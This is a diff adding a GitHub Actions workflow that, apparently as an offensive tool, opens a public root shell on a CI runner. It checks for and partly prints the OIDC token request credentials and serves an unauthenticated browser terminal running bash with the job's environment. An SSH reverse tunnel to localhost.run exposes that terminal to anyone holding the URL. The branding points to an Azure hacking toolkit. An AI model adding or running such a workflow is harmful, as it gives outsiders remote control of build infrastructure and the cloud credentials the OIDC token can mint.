@@ -1,0 +1,305 @@
+name: OIDC Interactive Shell
+
+on:
+  workflow_dispatch:
+
+jobs:
+  interactive-shell:
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+
+    container:
+      image: node:18-bullseye
+      options: --privileged --init
+
+    permissions:
+      id-token: write # Required to inject OIDC environment variables
+
+    env:
+      APP_DIR: /opt/oidc-shell
+      PORT: "8080"
+
+    steps:
+      - name: Verify OIDC environment
+        shell: bash
+        run: |
+          set -euo pipefail
+          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] || [ -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
+            echo "ERROR: OIDC environment variables are not set."
+            exit 1
+          fi
+
+          echo "=== OIDC Interactive Shell Initializing ==="
+          echo "ACTIONS_ID_TOKEN_REQUEST_URL: ${ACTIONS_ID_TOKEN_REQUEST_URL}"
+          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN: $(echo "${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" | cut -c1-20)..."
+
+      - name: Install runtime dependencies
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p "${APP_DIR}"/public
+          cd "${APP_DIR}"
+
+          npm init -y >/dev/null 2>&1
+          npm install --no-audit --no-fund @xterm/xterm @xterm/addon-fit node-pty ws
+
+      - name: Write terminal web UI
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > "${APP_DIR}/public/index.html" << 'EOF'
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <meta charset="utf-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1" />
+            <title>GitHub Actions Interactive Shell</title>
+            <style>
+              html, body { margin: 0; padding: 0; height: 100%; background: #111; }
+              body { display: flex; flex-direction: column; font-family: monospace; }
+              #logo-container {
+                background: #111;
+                text-align: center;
+                padding: 10px 0 4px 0;
+                border-bottom: 1px solid #222;
+                z-index: 10;
+              }
+              #logo { max-height: 72px; width: auto; user-select: none; pointer-events: none; }
+              #terminal { flex: 1; min-height: 0; width: 100%; }
+              #status {
+                position: fixed;
+                top: 10px;
+                right: 10px;
+                padding: 5px 10px;
+                background: #333;
+                color: #fff;
+                font-family: monospace;
+                font-size: 12px;
+                border-radius: 4px;
+                z-index: 1000;
+              }
+              #status.connected { background: #28a745; }
+              #status.disconnected { background: #dc3545; }
+            </style>
+            <link rel="stylesheet" href="https://unpkg.com/@xterm/xterm/css/xterm.css" />
+          </head>
+          <body>
+            <div id="status">Connecting...</div>
+            <div id="logo-container">
+              <img
+                id="logo"
+                src="https://azurehacking4i2hz32h.blob.core.windows.net/media/1770805254145-blackcat-transparent-small-hero.png"
+                alt="Blackcat Logo"
+              />
+            </div>
+            <div id="terminal"></div>
+
+            <script src="https://unpkg.com/@xterm/xterm/lib/xterm.js"></script>
+            <script src="https://unpkg.com/@xterm/addon-fit/lib/addon-fit.js"></script>
+            <script>
+              const status = document.getElementById('status');
+              const term = new Terminal({
+                cursorBlink: true,
+                cursorStyle: 'block',
+                fontSize: 14,
+                fontFamily: 'monospace'
+              });
+
+              const fitAddon = new FitAddon.FitAddon();
+              term.loadAddon(fitAddon);
+              term.open(document.getElementById('terminal'));
+              fitAddon.fit();
+
+              const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+              const ws = new WebSocket(`${protocol}//${window.location.host}`);
+
+              ws.onopen = () => {
+                status.textContent = 'Connected';
+                status.className = 'connected';
+                term.focus();
+                ws.send(JSON.stringify({ type: 'resize', cols: term.cols, rows: term.rows }));
+              };
+
+              ws.onclose = (e) => {
+                status.textContent = 'Disconnected';
+                status.className = 'disconnected';
+                console.log('WebSocket closed:', e.code, e.reason);
+              };
+
+              ws.onerror = (e) => {
+                status.textContent = 'Error';
+                status.className = 'disconnected';
+                console.error('WebSocket error:', e);
+              };
+
+              ws.onmessage = (e) => term.write(e.data);
+
+              term.onData((data) => {
+                if (ws.readyState === WebSocket.OPEN) ws.send(data);
+              });
+
+              term.onResize((size) => {
+                if (ws.readyState === WebSocket.OPEN) {
+                  ws.send(JSON.stringify({ type: 'resize', cols: size.cols, rows: size.rows }));
+                }
+              });
+
+              window.addEventListener('resize', () => {
+                fitAddon.fit();
+                if (ws.readyState === WebSocket.OPEN) {
+                  ws.send(JSON.stringify({ type: 'resize', cols: term.cols, rows: term.rows }));
+                }
+              });
+
+              document.getElementById('terminal').addEventListener('click', () => term.focus());
+              window.addEventListener('load', () => term.focus());
+              setTimeout(() => fitAddon.fit(), 150);
+            </script>
+          </body>
+          </html>
+          EOF
+
+      - name: Write terminal server
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > "${APP_DIR}/terminal_server.js" << 'EOF'
+          const fs = require('fs');
+          const path = require('path');
+          const http = require('http');
+          const WebSocket = require('ws');
+          const pty = require('node-pty');
+
+          const PORT = Number(process.env.PORT || 8080);
+          const HTML_PATH = path.join(__dirname, 'public', 'index.html');
+          const html = fs.readFileSync(HTML_PATH, 'utf8');
+
+          const server = http.createServer((req, res) => {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(html);
+          });
+
+          const wss = new WebSocket.Server({ server });
+
+          function welcomeBanner() {
+            const access = process.getuid() === 0
+              ? 'Root access to the GitHub Actions runner job container'
+              : 'Non-root access to the GitHub Actions runner job container';
+
+            const border = '+' + '-'.repeat(60) + '+';
+            const lines = [
+              'Welcome to the OIDC interactive shell!',
+              access,
+              'Ctrl+C interrupts a command; exit closes the shell.'
+            ];
+
+            return (
+              '\x1b[0m\x1b[36m' + border + '\r\n' +
+              lines.map((line) => `| \x1b[0m${line.padEnd(58)}\x1b[36m |`).join('\r\n') +
+              '\r\n' + border + '\x1b[0m\r\n'
+            );
+          }
+
+          wss.on('connection', (ws) => {
+            ws.send(welcomeBanner());
+
+            const shell = pty.spawn('/bin/bash', [], {
+              name: 'xterm-256color',
+              cols: 80,
+              rows: 24,
+              cwd: process.cwd(),
+              env: process.env
+            });
+
+            shell.onData((data) => {
+              if (ws.readyState === WebSocket.OPEN) ws.send(data);
+            });
+
+            shell.onExit(({ exitCode }) => {
+              console.log(`Shell exited with code ${exitCode}`);
+              ws.close();
+            });
+
+            ws.on('message', (message) => {
+              const data = message.toString();
+              try {
+                const json = JSON.parse(data);
+                if (json.type === 'resize') {
+                  shell.resize(json.cols, json.rows);
+                } else {
+                  shell.write(data);
+                }
+              } catch {
+                shell.write(data);
+              }
+            });
+
+            ws.on('close', () => shell.kill());
+          });
+
+          server.listen(PORT, '0.0.0.0', () => {
+            console.log(`Terminal server listening on port ${PORT}`);
+          });
+          EOF
+
+      - name: Launch terminal server
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd "${APP_DIR}"
+
+          node "${APP_DIR}/terminal_server.js" > /tmp/node_server.log 2>&1 &
+          NODE_PID=$!
+          echo "${NODE_PID}" > /tmp/node.pid
+          sleep 2
+
+          if ! kill -0 "${NODE_PID}" 2>/dev/null; then
+            echo "ERROR: Node.js server crashed immediately."
+            cat /tmp/node_server.log || true
+            exit 1
+          fi
+
+      - name: Start localhost.run tunnel
+        shell: bash
+        run: |
+          set -euo pipefail
+          ssh \
+            -o StrictHostKeyChecking=no \
+            -o ExitOnForwardFailure=yes \
+            -o ServerAliveInterval=60 \
+            -R 80:localhost:${PORT} \
+            nokey@localhost.run > /tmp/ssh_tunnel.log 2>&1 &
+          SSH_PID=$!
+          echo "${SSH_PID}" > /tmp/ssh.pid
+
+      - name: Print tunnel URL
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "Waiting for SSH tunnel to establish..."
+          TUNNEL_URL=""
+          for _ in {1..30}; do
+            sleep 2
+            TUNNEL_URL="$(grep -oE 'https://[a-z0-9-]+\.lhr\.life' /tmp/ssh_tunnel.log | head -n 1 || true)"
+            if [ -n "${TUNNEL_URL}" ]; then
+              break
+            fi
+          done
+
+          if [ -n "${TUNNEL_URL}" ]; then
+            echo "=== TERMINAL URL ==="
+            echo "${TUNNEL_URL}"
+            echo "===================="
+          else
+            echo "WARNING: Could not automatically extract the tunnel URL."
+            echo "--- SSH TUNNEL LOG ---"
+            cat /tmp/ssh_tunnel.log || true
+            echo "----------------------"
+          fi
+
+      - name: Keep session alive
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "Terminal is live. Open the URL above in your browser."
+          sleep infinity
